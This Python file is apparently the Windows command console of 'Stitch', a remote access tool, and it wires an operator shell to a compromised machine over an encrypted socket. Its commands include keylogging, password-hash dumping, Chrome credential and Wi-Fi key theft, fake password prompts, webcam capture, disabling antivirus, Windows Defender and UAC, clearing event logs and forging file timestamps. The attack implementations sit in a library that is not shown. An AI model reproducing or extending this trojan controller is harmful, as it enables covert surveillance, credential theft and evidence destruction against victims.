#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_lib
from stitch_help import *
from stitch_utils import *

class st_winshell(cmd.Cmd):

    def begin_session(self,target=None,port=80,socket=None,aes_key=None):
        cmd.Cmd.__init__(self)
        self.alive = True
        self.file_comp = []
        self.dir_comp = []
        self.all_comp = []
        socket.settimeout(30)
        self.cli_temp = 'C:\\Windows\\Temp\\'
        self.ignore = ['cls','clear','EOF','exit']
        self.cli_dwld= os.path.join(downloads_path,target)
        self.cli_os = stitch_lib.st_receive(socket, aes_key)
        self.cli_user = stitch_lib.st_receive(socket, aes_key)
        self.cli_hostname = stitch_lib.st_receive(socket, aes_key)
        self.cli_platform = stitch_lib.st_receive(socket, aes_key)
        self.stlib = stitch_lib.stitch_commands_library(socket, target, port, aes_key,
                                        self.cli_os,
                                        self.cli_platform,
                                        self.cli_hostname,
                                        self.cli_user,
                                        self.cli_dwld,
                                        self.cli_temp)
        self.stlib.history_check()
        self.get_path()

    def get_path(self,line='.'):
        self.do_pyexec('get_path.py',pylib=True)
        paths = self.stlib.receive()
        if no_error(paths):
            self.dir_comp = []
            self.all_comp = []
            self.file_comp = []
            total = paths.split('\n')
            for n in total:
                if n.endswith('\\') or n.endswith('/'):
                    self.dir_comp.append(n)
                else:
                    self.file_comp.append(n)
                self.all_comp.append(n)
        self.prompt = self.stlib.receive()

    def default(self, line):
        self.stlib.send(line)
        st_log.info('Sending command: "{}"'.format(line))
        st_print(self.stlib.receive())

    def precmd(self, line):
        if self.stlib.is_alive(line):
            return cmd.Cmd.precmd(self, line)
        else:
            self.alive = False
            return cmd.Cmd.precmd(self, 'exit')

    def postcmd(self, stop, line):
        if not line.startswith(tuple(self.ignore)): self.get_path()
        return cmd.Cmd.postcmd(self, stop, line)

################################################################################
#                       Start of COMMON LIB Section                            #
################################################################################

    def do_askpassword(self,line): self.stlib.askpassword()

    def do_avscan(self,line): self.stlib.avscan()

    def do_avkill(self,line): self.stlib.avkill()

    def do_cat(self,line): self.stlib.cat(line)

    def do_cd(self,line): self.stlib.cd(line)

    def do_chromedump(self,line): self.stlib.chromedump()

    def do_cls(self, line): self.stlib.clear()

    def do_clear(self, line): self.stlib.clear()

    def do_dir(self,line): self.stlib.ls(line)

    def do_displayoff(self,line): self.stlib.displayoff()

    def do_displayon(self,line): self.stlib.displayon()

    def do_download(self,line): self.stlib.download(line)

    def do_environment(self,line): self.stlib.environment()

    def do_fileinfo(self,line): self.stlib.fileinfo(line)

    def do_firewall(self,line): self.stlib.firewall(line)

    def do_hashdump(self,line): self.stlib.hashdump()

    def do_hide(self,line): self.stlib.hide(line)

    def do_hostsfile(self,line): self.stlib.hostsfile(line)

    def do_ifconfig(self,line): self.stlib.ifconfig(line)

    def do_location(self,line): self.stlib.location()

    def do_lockscreen(self,line): self.stlib.lockscreen()

    def do_ls(self,line): self.stlib.ls(line)

    def do_lsmod(self,line): self.stlib.lsmod(line)

    def do_more(self,line): self.stlib.more(line)

    def do_popup(self,line): self.stlib.popup()

    def do_pwd(self,line): self.stlib.pwd()

    def do_ps(self,line): self.stlib.ps(line)

    def do_pyexec(self,line,pylib=False): self.stlib.pyexec(line,pylib)

    def do_screenshot(self,line): self.stlib.screenshot()

    def do_sysinfo(self,line): self.stlib.sysinfo()

    def do_touch(self,line): self.stlib.touch(line)

    def do_unhide(self,line): self.stlib.unhide(line)

    def do_upload(self,line): self.stlib.upload(line)

    def do_vmscan(self,line): self.stlib.vmscan()

    def do_webcamsnap(self,line): self.stlib.webcamsnap(line)

    def do_webcamlist(self,line): self.stlib.webcamlist()

    def emptyline(self): pass

    def do_exit(self, line): return self.stlib.exit(alive=self.alive)

    def do_EOF(self, line): return self.stlib.EOF()

################################################################################
#                      Start of WINDOWS SPECIFIC Section                       #
################################################################################

    def do_clearev(self,line): self.stlib.clearev()

    def do_drives(self,line): self.stlib.drives()

    def do_editaccessed(self,line): self.stlib.editaccessed(line)

    def do_editcreated(self,line): self.stlib.editcreated(line)

    def do_editmodified(self,line): self.stlib.editmodified(line)

    def do_enableRDP(self,line): self.stlib.enableRDP()

    def do_enableUAC(self,line): self.stlib.enableUAC()

    def do_enableWindef(self,line): self.stlib.enableWindef()

    def do_freeze(self,line): self.stlib.freeze(line)

    def do_disableRDP(self,line): self.stlib.disableRDP()

    def do_disableUAC(self,line): self.stlib.disableUAC()

    def do_disableWindef(self,line): self.stlib.disableWindef()

    def do_keylogger(self,line): self.stlib.keylogger(line)

    def do_scanreg(self,line): self.stlib.scanreg()

    def do_wifikeys(self,line): self.stlib.wifikeys()

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def completedefault(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_cat(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_hostsfile(self, text, line, begidx, endidx):
        return find_completion(text,options_hostsfile)

    def complete_keylogger(self, text, line, begidx, endidx):
        return find_completion(text,options_keylogger)

    def complete_more(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.file_comp)

    def complete_cd(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.dir_comp)

    def complete_dir(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_download(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_firewall(self, text, line, begidx, endidx):
        return find_completion(text,options_fw_win)

    def complete_freeze(self, text, line, begidx, endidx):
        return find_completion(text,options_freeze)

    def complete_ls(self, text, line, begidx, endidx):
        return find_patterns(text, line, begidx, endidx, self.all_comp)

    def complete_pyexec(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,py_only=True)

    def complete_upload(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, uploads=True,all_dir=True)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_askpassword(self): st_help_askpassword()

    def help_avscan(self): st_help_avscan()

    def help_avkill(self): st_help_avkill()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_chromedump(self): st_help_chromedump()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_clearev(self): st_help_clearev()

    def help_dir(self): st_help_dir()

    def help_disableRDP(self): st_help_disableRDP()

    def help_disableUAC(self): st_help_disableUAC()

    def help_disableWindef(self): st_help_disableWindef()

    def help_displayoff(self): st_help_displayoff()

    def help_displayon(self): st_help_displayon()

    def help_download(self): st_help_download()

    def help_drives(self): st_help_drives()

    def help_editaccessed(self): st_help_editaccessed()

    def help_editcreated(self): st_help_editcreated()

    def help_editmodified(self): st_help_editmodified()

    def help_enableRDP(self): st_help_enableRDP()

    def help_enableUAC(self): st_help_enableUAC()

    def help_enableWindef(self): st_help_enableWindef()

    def help_environment(self): st_help_environment()

    def help_fileinfo(self): st_help_fileinfo()

    def help_firewall(self): st_help_firewall()

    def help_freeze(self): st_help_freeze()

    def help_hashdump(self): st_help_hashdump()

    def help_hide(self): st_help_hide()

    def help_hostsfile(self): st_help_hostsfile()

    def help_ifconfig(self): st_help_ifconfig()

    def help_keylogger(self): st_help_keylogger()

    def help_ls(self): st_help_ls()

    def help_lsmod(self): st_help_lsmod()

    def help_location(self): st_help_location()

    def help_lockscreen(self): st_help_lockscreen()

    def help_more(self): st_help_more()

    def help_popup(self): st_help_popup()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_pyexec(self): st_help_pyexec()

    def help_scanreg(self): st_help_scanreg()

    def help_screenshot(self): st_help_screenshot()

    def help_sysinfo(self): st_help_sysinfo()

    def help_touch(self): st_help_touch()

    def help_unhide(self): st_help_unhide()

    def help_upload(self): st_help_upload()

    def help_vmscan(self): st_help_vmscan()

    def help_webcamsnap(self): st_help_webcamsnap()

    def help_webcamlist(self): st_help_webcamlist()

    def help_wifikeys(self): st_help_wifikeys()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def start_shell(t,p,c,a):
    shell = st_winshell()
    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
    shell.cmdloop()
